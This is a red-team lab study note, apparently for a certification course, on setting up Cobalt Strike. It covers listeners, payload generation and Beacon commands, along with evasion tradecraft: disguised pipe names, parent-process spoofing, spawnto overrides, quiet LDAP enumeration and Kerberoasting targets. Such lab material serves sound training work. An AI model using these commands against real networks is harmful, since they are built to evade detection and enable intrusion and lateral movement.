# Cobalt Strike Initial Commands  

The objective of this lab is to setup Cobalt Strike.  You will create listeners, Malleable C2 profile, generate payloads, and Beacons.  

* [Beacon commands](https://www.zeropointsecurity.co.uk/path-player?courseid=red-team-ops&unit=696a1d7abd92eef9e30f7537Unit)  

# Launch Cobalt Strike

1. On the Windows taskbar, click on the Cobalt Strike icon.
1. Fill in the connection details for the team server.
  1. Host: `10.0.0.5`
  1. Port: `50050`
  1. Password: `Passw0rd!`

# Create Listeners

1. Go to **Cobalt Strike > Listeners** to bring  up the Listeners tab.
1. Click **Add** to create a new listener.

Add the following listeners:

## HTTP

1. Name: `http`
1. Payload: Beacon HTTP
1. HTTP Hosts: `www.bleepincomputer.com`
1. HTTP Host (Stager) : `www.bleepincomputer.com`

<img src="/images/cs_setup1.png">  

## SMB

1. Name: `smb`
1. Payload: Beacon SMB
1. Pipename: `srvsvc-a1b2c3d4-e5f6-7890-abcd-efabef56789a`  

<img src="/images/cs_setup2.png">  

## TCP

1. Name: `tcp`
1. Payload: Beacon TCP
1. Port: `4444`
1. Bind to localhost: False

<img src="/images/cs_setup3.png">  

## TCP (local)

1. Name: `tcp-local`
1. Payload: Beacon TCP
1. Port: `1337`
1. Bind to localhost: True

<img src="/images/cs_setup4.png">

# Generate Payloads

> ⚠️ **PREREQUISITE — First Update C2 Malleable Profile**  

> First update [Defence evasion Malleable C2 profile](https://github.com/botesjuan/CRTO-Study-Notes/blob/main/labs/defence-evasion-lab-Malleable.md#part-1--malleable-c2-profile)

<img src="/images/malleable-c2-profile-updates.png">  

> 1. Malleable C2 profile active (docker restart)  
> 2. Artifact Kit built → ThreatCheck clean → `artifact.cna` loaded in Script Manager  
> 3. Resource Kit built → ThreatCheck AMSI clean → `resources.cna` loaded in Script Manager  
>
> Now generate payloads — they will use the custom artifact stubs.

1. Go to **Payloads > Windows Stageless Generate All Payloads**
2. Folder: `C:\Payloads`
3. Click **Generate**

<img src="/images/generate_payloads.png">  

# Interact with Beacon

1. Run *C:\Payloads\http_x64.exe* and a new Beacon session should appear.
1. Familiarise yourself with the client UI and running commands in Beacon.

⚠️ Use the `help` command to list all of the available commands, and `help [alias]` to get help for a specific command.

---

## OPSEC Warnings & Exam-Day Notes

### SMB Listener Pipename — Change on Exam Day  

`srvsvc-a1b2c3d4-e5f6-7890-abcd-efabef56789a` is the new pipename
flagged by Defender and detection rules. **Never use this on exam day.**

Create the SMB listener with a custom pipename that blends with legitimate Windows pipes:
```
# Good examples:
wkssvc-<random>
srvsvc-<random>
ntsvcs-<guid>

# Bad — all flagged:
TSVCPIPE-*   msagent_*   postex_*   MSSE-*
```

---

### `pwd` 
Use `pwd` to print the current working directory.

```cs
beacon> pwd       // correct
beacon> getpwd    // invalid — does not exist
```

---

### First Beacon Checklist — Run Immediately After Callback

**Step 1 — beacon context (do this first, every beacon):**

```cs
beacon> sleep 3 20                                      // reduce check-in noise
beacon> ps                                              // get process list
beacon> ppid <explorer.exe or svchost.exe PID>          // spoof parent — see note below
beacon> spawnto x64 %windir%\sysnative\werfault.exe     // override default rundll32
beacon> getuid                                          // confirm user context
```

**Step 2 — ldapsearch immediately after (OPSEC-🟢SAFE — do this on every beacon without exception):**

ldapsearch is a BOF — no child process, no event logs, runs in beacon thread. It is the
fastest and safest way to map the entire domain. Run it before making any attack decisions.

```cs
// Single query — hits users, computers, and groups in one shot
beacon> ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes samaccountname,memberof,admincount,servicePrincipalName,dNSHostName,operatingSystem

// Trust enumeration
beacon> ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes
```

**What to look for immediately in the output:**

| Finding | Next action |
|---------|------------|
| Account with `servicePrincipalName` set | Kerberoast candidate |
| `adminCount=1` with no DA group membership | Leftover ACLs — check with BloodHound |
| `trustPartner` results | Forest/domain trust attack paths |
| Computer names and roles (DB, FS, DC) | Plan lateral movement targets |

---

### `ppid` — No `explorer.exe` on WinRM Beacons

`explorer.exe` only runs in **interactive desktop sessions** (console or RDP login).
A beacon landed via `jump winrm64` runs inside `wsmprovhost.exe` — no interactive session,
no explorer.exe in the process list.

**Use `svchost.exe` as the ppid target instead:**

```cs
beacon> ps                          // find a svchost.exe PID running as SYSTEM or LOCAL SERVICE
beacon> ppid <svchost.exe PID>      // svchost spawning werfault = normal Windows behaviour
```

| Beacon landed via | `ppid` target |
|---|---|
| WinRM (`jump winrm64`) | `svchost.exe` |
| Interactive user session | `explorer.exe` |
| Service execution | `services.exe` or `svchost.exe` |

---

### `net computers` — OPSEC-🔴UNSAFE, and Fails from WinRM Token

`net computers` spawns `cmd.exe` as a child process — visible to Sysmon Event 1 and EDR.
It also fails with **Error 5 (Access Denied)** from a WinRM Type 3 network logon token
because the non-interactive token lacks sufficient privileges for domain enumeration over the network.

**Never use `net computers`. Use ldapsearch BOF instead (OPSEC-🟢SAFE):**

```cs
// Enumerate domain computers — OPSEC-🟢SAFE (BOF, no child process)
beacon> ldapsearch (samAccountType=805306369) --attributes name,dnsHostName,operatingSystem
```

> ⚠️ ldapsearch also requires a valid Kerberos token — see note in Discovery lab.
